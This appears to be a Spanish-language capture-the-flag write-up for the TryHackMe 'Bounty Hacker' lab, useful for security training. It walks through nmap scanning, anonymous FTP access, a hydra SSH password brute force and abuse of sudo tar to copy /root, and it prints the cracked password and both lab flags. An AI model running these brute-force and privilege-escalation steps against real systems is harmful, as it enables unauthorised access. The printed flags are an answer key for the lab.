---
layout: post
title: Tryhackme - Bounty Hacker
autor: S3cureroy
date: 2023-02-19
categories: [CTF, Tryhackme]
tags: [ftp,sudo,brute force,hydra, ssh]
---

Después de realizar la máquina de [Mr. Robot](https://s3cureroy.github.io/thm-writeup-mr_robot/), la cual es bastante más enrevesada, esta puede resultar un paso atrás en la evolución de las máquinas que voy resolviendo, pero es que la máquina es de la serie de anime Cowboy Bebop, que si no la has visto, deja de leer este *writeup* y ponte a verla.

¿Ya la has visto? bien, podemos seguir… Pues resulta, que esta máquina dispone de un acceso inicial sencillo, puesto que se proporciona el usuario y un diccionario para acceder mediante SSH, pero en la escalada de privilegios se usa otro [LOLbin](https://www.securityhq.com/blog/security-101-lolbins-malware-exploitation/), un binario legítimo del sistema que es usado para otros fines como escalar privilegios, ganar acceso inicial, etc. En este caso, es el comando tar, usado para comprimir ficheros.

## Enumeración.

Se ejecuta el comando ```nmap``` para conocer los puertos abiertos, así como, las versiones y posibles vulnerabilidades conocidas de éstos.

Para ello, se añade al comento los parámetros ```-sV``` y ```-sC```, este último, para lanzar los *scripts nse* más usados por ```mmap``` en los servicios que detecte.

~~~
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 03:22 EDT
Nmap scan report for 10.10.245.85
Host is up (0.045s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.71.139
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.17 seconds
~~~

Se observan tres puertos, los pertenecientes a los protocolos SSH (22), HTTP (80) y FTP (21).

### Enumeración FTP.

El puerto 21, se puede observar que admite acceso con usuario anónimo (por eso se lanzan los scripts *nse*).

Se accede entonces con el mencionado usuario **anonymous**, y se verifica que hay dos ficheros accesibles en la ruta de acceso inicial, se descargan ambos para ver el contenido.

~~~shell
> $ ftp 10.10.245.85
Connected to 10.10.245.85.
220 (vsFTPd 3.0.3)
Name (10.10.245.85:secureroy): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
~~~

- El contenido del fichero locks.txt parece ser un diccionario, probablemente se use más adelante.

~~~
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
~~~

- En cuanto al contenido del fichero task.txt, se verifica que es una lista de tareas, generada por el usuario lin.

~~~
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
~~~

### Enumeración Web.

Revisando los otros puertos, se verifica el puerto 80, en el cual se sirve una web estática, que revisando el código, no se encuentra nada reseñable.

![https://i.imgur.com/J0ZJhrN.png](https://i.imgur.com/J0ZJhrN.png)

Se ejecuta un comando ```dirsearch``` para descubrir más directorios de la web, pero no se encuentra ninguno de especial importancia.

~~~
[03:52:06] Starting:
[03:52:09] 403 -  277B  - /.htaccess-local
[03:52:09] 403 -  277B  - /.htaccess-marco
[03:52:09] 403 -  277B  - /.htaccess.orig
[03:52:09] 403 -  277B  - /.htaccess-dev
[03:52:09] 403 -  277B  - /.htaccess.bak1
[03:52:09] 403 -  277B  - /.htaccess.old
[03:52:09] 403 -  277B  - /.htaccess.sample
[03:52:09] 403 -  277B  - /.htaccess.save
[03:52:09] 403 -  277B  - /.htaccess.txt
[03:52:09] 403 -  277B  - /.htaccessBAK
[03:52:09] 403 -  277B  - /.htaccessOLD
[03:52:09] 403 -  277B  - /.htaccessOLD2
[03:52:09] 403 -  277B  - /.htpasswd-old
[03:52:09] 403 -  277B  - /.httr-oauth
[03:52:12] 200 -  969B  - /
[03:52:25] 301 -  313B  - /images  ->  http://10.10.245.85/images/
[03:52:25] 200 -  969B  - /index.html
[03:52:32] 403 -  277B  - /server-status
[03:52:32] 403 -  277B  - /server-status/

Task Completed
~~~

## Acceso inicial.

Volviendo al puerto de SSH, como se dispone de un usuario (lin) y un fichero que podría ser un diccionario (locks.txt) se utiliza el comando hydra para ver si se puede tener acceso mediante fuerza bruta.

~~~
hydra -l lin -P locks.txt ssh://10.10.108.125
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-22 13:46:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.108.125:22/
[22][ssh] host: 10.10.108.125   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-22 13:46:29
~~~

Como se puede observar, se obtiene satisfactoriamente la contraseña del usuario lin, que se usa para acceder y por tanto, obtener la primera de las *flag*, que se encuentra en el directorio del propio usuario lin.

~~~
cat user.txt
THM{CR1M3_SyNd1C4T3}
~~~

## Escalada de privilegios.

Se realizan varias enumeraciones de vectores conocidos para escalar privilegios, pero es mediante el comando ```sudo -l``` con el que se pueden ver los comandos que se pueden ejecutar con permisos de root por el usuario, obteniendo que el comando tar puede ser usado con dichos privilegios.

~~~shell
sudo -l
Matching Defaults entries for lin on bountyhacker:
	env_reset, mailbadpass,
	secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:snap/bin

User lin may run the following commands on bountyhacker:
	(root) /bin/tar
~~~

Por tanto, y como sólo interesa obtener el fichero que contiene la flag, se comprime el directorio root en un fichero en el home del propio usuario.

> En [GTFObins](https://gtfobins.github.io/gtfobins/tar/#sudo) mencionan un comando para obtener los tan ansiados permisos de root, pero en este caso, no era necesario, y por hacerlo de otra forma diferente.

~~~
sudo tar -cvf root_folder.tar /root
tar: Removing leading `/' from member names
/root/
/root/.profile
/root/.nano/
/root/.nano/search_history
/root/.bash_history
/root/.ssh/
/root/.ssh/id_rsa.pub
/root/.ssh/id_rsa
/root/.bashrc
/root/*
/root/root.txt
/root/.selected_editor
/root/.cache/
~~~

Ahora se descomprime, obteniendo la flag de root.

~~~
tar -xvf root_folder.tar
root/
root/.profile
root/.nano/
root/.nano/search_history
root/.bash_history
root/.ssh/
root/.ssh/id_rsa.pub
root/.ssh/id_rsa
root/.bashrc
root/*
root/root.txt
root/.selected_editor
root/.cache/
~~~

~~~shell
cd root
cat root.txt
THM{80UN7Y_h4cK3r}
~~~